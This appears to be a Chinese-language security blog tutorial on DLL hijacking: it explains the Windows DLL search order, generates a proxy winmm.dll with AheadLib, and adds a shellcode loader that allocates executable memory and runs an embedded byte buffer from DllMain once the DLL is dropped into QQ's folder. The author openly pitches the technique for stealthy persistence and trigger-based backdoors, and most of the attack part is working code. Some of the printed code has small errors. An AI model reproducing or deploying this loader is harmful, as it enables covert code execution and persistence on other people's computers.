@@ -1,0 +1,359 @@
+本文所采用技术，仅用来实现自定义功能，适用场景仅为授权的测试中进行权限维持或为个人电脑添加定制化功能，如：启动QQ同时启动计算器，方便实用~
+
+*本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。
+
+## 0×01 DLL劫持
+
+当一个可执行文件运行时，Windows加载器会将PE(Portable Executable File
+Format)文件映射到内存中，然后分析可执行文件的导入表，并将相应的DLL文件装入，EXE文件通过导入表找到DLL中相应的函数，从而运行相应的函数。
+
+导入表中只有DLL名，并不存在任何路径信息，因此Windows加载器必须在磁盘上搜索DLL文件。搜索顺序为：当前程序所在的目录->Windows系统目录->环境变量。利用这个特点，可以伪造一个系统同名DLL放在程序目录下，当提供相同的输出表，当EXE加载DLL时会首先会搜索当前目录下DLL并装入，调用DLL函数时，伪造的DLL将程序所调用的函数全部转发至系统真实DLL中，并在此过程中完成恶意功能。此种方式被称之为DLL劫持。
+
+在Windows7及以上系统采用了KnownDLLs
+
+注册表位置：\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session
+Manager\KnownDLLs
+
+在此项下的DLL会被禁止从EXE自身所在目录下调用，而只能从系统目录即SYSTEM32目录下调用
+
+![image-20200612162845427](https://image.3001.net/images/20200612/1591956246_5ee353165651e.png!small)
+
+## 0x02 生成DLL劫持代码
+
+利用Proccess可以查看进程加载的DLL，选择合适的DLL，这里选择的是winmm.dll
+
+![image-20200612163214472](https://image.3001.net/images/20200612/1591956272_5ee35330f06de.png!small)
+
+winmm.dll是Windows多媒体相关应用程序接口，并且不在KnownDLLs中，可以用来进行劫持。
+
+首先使用AheadLib生成 DLL劫持C源代码，选择要劫持的DLL：
+
+![image-20200612164133902](https://image.3001.net/images/20200612/1591956279_5ee3533780f47.png!small)
+
+![image-20200612164235190](https://image.3001.net/images/20200612/1591956291_5ee3534367207.png!small)
+
+生成代码(已略去大段导出代码)：
+
+    
+    
+    ​  
+    //  
+    // created by AheadLib  
+    // github:https://github.com/strivexjun/AheadLib-x86-x64  
+    //  
+    ​  
+    #include <windows.h>  
+    #include <Shlwapi.h>  
+    ​  
+    #pragma comment( lib, "Shlwapi.lib")  
+    ​  
+    #pragma comment(linker, "/EXPORT:Noname2=_AheadLib_Unnamed2,@2,NONAME")  
+    #pragma comment(linker, "/EXPORT:mciExecute=_AheadLib_mciExecute,@3")  
+    #pragma comment(linker, "/EXPORT:CloseDriver=_AheadLib_CloseDriver,@4")  
+    #pragma comment(linker, "/EXPORT:DefDriverProc=_AheadLib_DefDriverProc,@5")  
+    #pragma comment(linker, "/EXPORT:midiOutCachePatches=_AheadLib_midiOutCachePatches,@75")  
+    #pragma comment(linker, "/EXPORT:midiOutClose=_AheadLib_midiOutClose,@76")  
+    #pragma comment(linker, "/EXPORT:midiOutGetDevCapsA=_AheadLib_midiOutGetDevCapsA,@77")  
+    #pragma comment(linker, "/EXPORT:midiOutGetDevCapsW=_AheadLib_midiOutGetDevCapsW,@78")  
+    #pragma comment(linker, "/EXPORT:midiOutGetErrorTextA=_AheadLib_midiOutGetErrorTextA,@79")  
+    #pragma comment(linker, "/EXPORT:midiOutGetErrorTextW=_AheadLib_midiOutGetErrorTextW,@80")  
+    #pragma comment(linker, "/EXPORT:midiOutGetID=_AheadLib_midiOutGetID,@81")
+    ...
+    ...
+    ...  
+    #pragma comment(linker, "/EXPORT:midiOutGetNumDevs=_AheadLib_midiOutGetNumDevs,@82")  
+    #pragma comment(linker, "/EXPORT:midiOutGetVolume=_AheadLib_midiOutGetVolume,@83")  
+    #pragma comment(linker, "/EXPORT:midiOutLongMsg=_AheadLib_midiOutLongMsg,@84")  
+    #pragma comment(linker, "/EXPORT:midiOutMessage=_AheadLib_midiOutMessage,@85")  
+    #pragma comment(linker, "/EXPORT:midiOutOpen=_AheadLib_midiOutOpen,@86")  
+    #pragma comment(linker, "/EXPORT:midiOutPrepareHeader=_AheadLib_midiOutPrepareHeader,@87")  
+    #pragma comment(linker, "/EXPORT:midiOutReset=_AheadLib_midiOutReset,@88")  
+    #pragma comment(linker, "/EXPORT:midiOutSetVolume=_AheadLib_midiOutSetVolume,@89")  
+    #pragma comment(linker, "/EXPORT:midiOutShortMsg=_AheadLib_midiOutShortMsg,@90")  
+    #pragma comment(linker, "/EXPORT:mmsystemGetVersion=_AheadLib_mmsystemGetVersion,@141")  
+    #pragma comment(linker, "/EXPORT:mod32Message=_AheadLib_mod32Message,@142")  
+    #pragma comment(linker, "/EXPORT:waveOutReset=_AheadLib_waveOutReset,@186")  
+    #pragma comment(linker, "/EXPORT:waveOutRestart=_AheadLib_waveOutRestart,@187")  
+    #pragma comment(linker, "/EXPORT:waveOutSetPitch=_AheadLib_waveOutSetPitch,@188")  
+    #pragma comment(linker, "/EXPORT:waveOutSetPlaybackRate=_AheadLib_waveOutSetPlaybackRate,@189")  
+    #pragma comment(linker, "/EXPORT:waveOutSetVolume=_AheadLib_waveOutSetVolume,@190")  
+    #pragma comment(linker, "/EXPORT:waveOutUnprepareHeader=_AheadLib_waveOutUnprepareHeader,@191")  
+    #pragma comment(linker, "/EXPORT:waveOutWrite=_AheadLib_waveOutWrite,@192")  
+    #pragma comment(linker, "/EXPORT:wid32Message=_AheadLib_wid32Message,@193")  
+    #pragma comment(linker, "/EXPORT:wod32Message=_AheadLib_wod32Message,@194")  
+    ​  
+    ​  
+    PVOID pfnAheadLib_Unnamed2;  
+    PVOID pfnAheadLib_mciExecute;  
+    PVOID pfnAheadLib_CloseDriver;  
+    PVOID pfnAheadLib_waveOutGetPlaybackRate;  
+    PVOID pfnAheadLib_waveOutGetPosition;  
+    PVOID pfnAheadLib_waveOutGetVolume;  
+    PVOID pfnAheadLib_waveOutMessage;  
+    PVOID pfnAheadLib_waveOutOpen;
+    ...
+    ...
+    ...  
+    PVOID pfnAheadLib_waveOutPause;  
+    PVOID pfnAheadLib_waveOutPrepareHeader;  
+    PVOID pfnAheadLib_waveOutReset;  
+    PVOID pfnAheadLib_waveOutRestart;  
+    PVOID pfnAheadLib_waveOutSetPitch;  
+    PVOID pfnAheadLib_waveOutSetPlaybackRate;  
+    PVOID pfnAheadLib_waveOutSetVolume;  
+    PVOID pfnAheadLib_waveOutUnprepareHeader;  
+    PVOID pfnAheadLib_waveOutWrite;  
+    PVOID pfnAheadLib_wid32Message;  
+    PVOID pfnAheadLib_wod32Message;  
+    ​  
+    ​  
+    static  
+    HMODULE g_OldModule = NULL;  
+    ​  
+    VOID WINAPI Free()  
+    {  
+      if (g_OldModule)  
+      
+        FreeLibrary(g_OldModule);  
+      }  
+    }  
+    ​  
+    ​  
+    BOOL WINAPI Load()  
+    {  
+      TCHAR tzPath[MAX_PATH];  
+      TCHAR tzTemp[MAX_PATH * 2];  
+    ​  
+      //  
+      // 这里是否从系统目录或当前目录加载原始DLL  
+      //  
+      GetSystemDirectory(tzPath, MAX_PATH);  
+      lstrcat(tzPath, TEXT("\\winmm.dll"));  
+    ​  
+      g_OldModule = LoadLibrary(tzPath);  
+      if (g_OldModule == NULL)  
+      {  
+        wsprintf(tzTemp, TEXT("无法找到模块 %s,程序无法正常运行"), tzPath);  
+        MessageBox(NULL, tzTemp, TEXT("AheadLib"), MB_ICONSTOP);  
+      }  
+    ​  
+      return (g_OldModule != NULL);  
+    ​  
+    }  
+    ​  
+    ​  
+    FARPROC WINAPI GetAddress(PCSTR pszProcName)  
+    {  
+      FARPROC fpAddress;  
+      CHAR szProcName[64];  
+      TCHAR tzTemp[MAX_PATH];  
+    ​  
+      fpAddress = GetProcAddress(g_OldModule, pszProcName);  
+      if (fpAddress == NULL)  
+      {  
+        if (HIWORD(pszProcName) == 0)  
+        {  
+          wsprintfA(szProcName, "#%d", pszProcName);  
+          pszProcName = szProcName;  
+        }  
+    ​  
+        wsprintf(tzTemp, TEXT("无法找到函数 %hs,程序无法正常运行"), pszProcName);  
+        MessageBox(NULL, tzTemp, TEXT("AheadLib"), MB_ICONSTOP);  
+        ExitProcess(-2);  
+      }  
+      return fpAddress;  
+    }  
+    ​  
+    BOOL WINAPI Init()  
+    {  
+      pfnAheadLib_Unnamed2 = GetAddress(MAKEINTRESOURCEA(2));  
+      pfnAheadLib_mciExecute = GetAddress("mciExecute");  
+      pfnAheadLib_CloseDriver = GetAddress("CloseDriver");  
+      pfnAheadLib_DefDriverProc = GetAddress("DefDriverProc");  
+      pfnAheadLib_DriverCallback = GetAddress("DriverCallback");  
+      pfnAheadLib_DrvGetModuleHandle = GetAddress("DrvGetModuleHandle");  
+      pfnAheadLib_GetDriverModuleHandle = GetAddress("GetDriverModuleHandle");  
+      pfnAheadLib_NotifyCallbackData = GetAddress("NotifyCallbackData");  
+      pfnAheadLib_OpenDriver = GetAddress("OpenDriver");  
+      pfnAheadLib_PlaySound = GetAddress("PlaySound");  
+      pfnAheadLib_PlaySoundA = GetAddress("PlaySoundA");  
+      pfnAheadLib_PlaySoundW = GetAddress("PlaySoundW");  
+      pfnAheadLib_SendDriverMessage = GetAddress("SendDriverMessage");  
+      pfnAheadLib_WOW32DriverCallback = GetAddress("WOW32DriverCallback");  
+      ...
+      ...
+      ...  
+      pfnAheadLib_waveOutGetVolume = GetAddress("waveOutGetVolume");  
+      pfnAheadLib_waveOutMessage = GetAddress("waveOutMessage");  
+      pfnAheadLib_waveOutOpen = GetAddress("waveOutOpen");  
+      pfnAheadLib_waveOutPause = GetAddress("waveOutPause");  
+      pfnAheadLib_waveOutPrepareHeader = GetAddress("waveOutPrepareHeader")  
+      pfnAheadLib_waveOutReset = GetAddress("waveOutReset");  
+      pfnAheadLib_waveOutRestart = GetAddress("waveOutRestart");  
+      pfnAheadLib_waveOutSetPitch = GetAddress("waveOutSetPitch");  
+      pfnAheadLib_waveOutSetPlaybackRate = GetAddress("waveOutSetPlaybackRate");  
+      pfnAheadLib_waveOutSetVolume = GetAddress("waveOutSetVolume");  
+      pfnAheadLib_waveOutUnprepareHeader = GetAddress("waveOutUnprepareHeader");  
+      pfnAheadLib_waveOutWrite = GetAddress("waveOutWrite");  
+      pfnAheadLib_wid32Message = GetAddress("wid32Message");  
+      pfnAheadLib_wod32Message = GetAddress("wod32Message");  
+      return TRUE;  
+    }   
+    ​  
+    DWORD WINAPI ThreadProc(LPVOID lpThreadParameter)  
+    {  
+      HANDLE hProcess;  
+    ​  
+      PVOID addr1 = reinterpret_cast<PVOID>(0x00401000);  
+      BYTE data1[] = { 0x90, 0x90, 0x90, 0x90 };  
+    ​  
+      //  
+      // 绕过VMP3.x 的内存保护  
+      //  
+      hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetCurrentProcessId());  
+      if (hProcess)  
+      {  
+        WriteProcessMemory(hProcess, addr1, data1, sizeof(data1), NULL);  
+    ​  
+        CloseHandle(hProcess);  
+      }  
+    ​  
+      return 0;  
+    }  
+    ​  
+    ​  
+    BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)  
+    {  
+      if (dwReason == DLL_PROCESS_ATTACH)  
+      {  
+        DisableThreadLibraryCalls(hModule);  
+    ​  
+        if (Load() && Init())  
+        {  
+          TCHAR szAppName[MAX_PATH] = TEXT("MyApp.exe");  
+          TCHAR szCurName[MAX_PATH];  
+    ​  
+          GetModuleFileName(NULL, szCurName, MAX_PATH);  
+          PathStripPath(szCurName);  
+    ​  
+          //是否判断宿主进程名  
+          if (StrCmpI(szAppName, szAppName) == 0)  
+          {  
+            //启动补丁线程或者其他操作  
+            HANDLE hThread = CreateThread(NULL, NULL, ThreadProc, NULL, NULL, NULL);  
+            if (hThread)  
+            {  
+              CloseHandle(hThread);  
+            }  
+          }  
+        }  
+      }  
+      else if (dwReason == DLL_PROCESS_DETACH)  
+      {  
+        Free();  
+      }  
+    ​  
+      return TRUE;  
+    }  
+    ​  
+    EXTERN_C __declspec(naked) void __cdecl AheadLib_Unnamed2(void)  
+    {  
+      __asm jmp pfnAheadLib_Unnamed2;  
+    }  
+    ​...
+    ...
+    ...  
+    EXTERN_C __declspec(naked) void __cdecl AheadLib_wod32Message(void)  
+    {  
+      __asm jmp pfnAheadLib_wod32Message;  
+    }  
+    ​
+
+生成代码长度和输出表有关。
+
+## 0x03 编写新DLL
+
+使用VS2015（201x都行吧）创建DLL项目：
+
+![image-20200612164810520](https://image.3001.net/images/20200612/1591956372_5ee353948e664.png!small)
+
+![image-20200612164957207](https://image.3001.net/images/20200612/1591956422_5ee353c661a2a.png!small)
+
+将代码拷贝到dllmain.cpp中：
+
+![image-20200612165142368](https://image.3001.net/images/20200612/1591956428_5ee353ccbd9d4.png!small)
+
+在winmm_fb.cpp文件中实现自定义功能：
+
+    
+    
+    unsigned char shellcode[] =  
+    "\xbf\x6e\x4a\x25\x08\xd9\xeb\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"  
+    "\x31\x31\x7d\x13\x03\x7d\x13\x83\xc5\x6a\xa8\xd0\xf4\x9a\xae"  
+    "\x1b\x05\x5a\xcf\x92\xe0\x6b\xcf\xc1\x61\xdb\xff\x82\x24\xd7"  
+    "\x74\xc6\xdc\x6c\xf8\xcf\xd3\xc5\xb7\x29\xdd\xd6\xe4\x0a\x7c"  
+    "\x54\xf7\x5e\x5e\x65\x38\x93\x9f\xa2\x25\x5e\xcd\x7b\x21\xcd"  
+    "\xe2\x08\x7f\xce\x89\x42\x91\x56\x6d\x12\x90\x77\x20\x29\xcb"  
+    "\x57\xc2\xfe\x67\xde\xdc\xe3\x42\xa8\x57\xd7\x39\x2b\xbe\x26"  
+    "\xc1\x80\xff\x87\x30\xd8\x38\x2f\xab\xaf\x30\x4c\x56\xa8\x86"  
+    "\x2f\x8c\x3d\x1d\x97\x47\xe5\xf9\x26\x8b\x70\x89\x24\x60\xf6"  
+    "\xd5\x28\x77\xdb\x6d\x54\xfc\xda\xa1\xdd\x46\xf9\x65\x86\x1d"  
+    "\x60\x3f\x62\xf3\x9d\x5f\xcd\xac\x3b\x2b\xe3\xb9\x31\x76\x69"  
+    "\x3f\xc7\x0c\xdf\x3f\xd7\x0e\x4f\x28\xe6\x85\x00\x2f\xf7\x4f"  
+    "\x65\xcf\x15\x5a\x93\x78\x80\x0f\x1e\xe5\x33\xfa\x5c\x10\xb0"  
+    "\x0f\x1c\xe7\xa8\x65\x19\xa3\x6e\x95\x53\xbc\x1a\x99\xc0\xbd"  
+    "\x0e\xfa\x87\x2d\xd2\xd3\x22\xd6\x71\x2c";  
+    ​  
+    ​  
+    DWORD WINAPI run(LPVOID lpParameter)  
+    {  
+    ​  
+      LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);  
+      memcpy(Memory, shellcode, sizeof(shellcode));  
+      //运行  
+      ((void(*)())Memory)();  
+      return 0;  
+    }
+
+DllMain函数是DLL的入口函数，在DllMain()函数中创建线程调用该功能（记得添加声明）：
+
+    
+    
+    HANDLE hThread1 = CreateThread(NULL, 0, run, NULL, 0, NULL);
+
+修改好代码后编译
+
+![image-20200612171633669](https://image.3001.net/images/20200612/1591956470_5ee353f6d77e7.png!small)
+
+![image-20200612171733398](https://image.3001.net/images/20200612/1591956477_5ee353fd81c6a.png!small)
+
+## 0x04 DLL劫持
+
+修改DLL名称为winmm.dll，并放入QQ的exe目录下：
+
+![image-20200612172048330](https://image.3001.net/images/20200612/1591956484_5ee3540498523.png!small)
+
+打开QQ:
+
+![gif](https://image.3001.net/images/20200612/1591956491_5ee3540b89479.gif!small)
+
+QQ与计算器同时启动功能就实现了~~
+
+在授权的测试中利用该种方式实现的shellcode加载，可以依托于正常启动项（比如杀毒软件？），通过正常开机启动项创建线程，执行相应的shellcode，更为隐蔽的进行权限维持。
+
+也可以劫持相关软件，实现触发式shllcode执行，制作触发式后门进行权限维持，在特定条件下执行shellcode。
+
+## 0x05 后记
+
+完整代码:
+
+> DLLhijack-ShellcodeLoader:<https://github.com/LDrakura/DLLhijack-> ShellcodeLoader>
+
+高清文件：
+
+> 链接: <https://pan.baidu.com/s/149PBcZ5OmSA5Clt8LPlZfg> 提取码: j8tx
+
+参考：
+
+> AheadLib:<https://github.com/strivexjun/AheadLib-x86-x64>
+
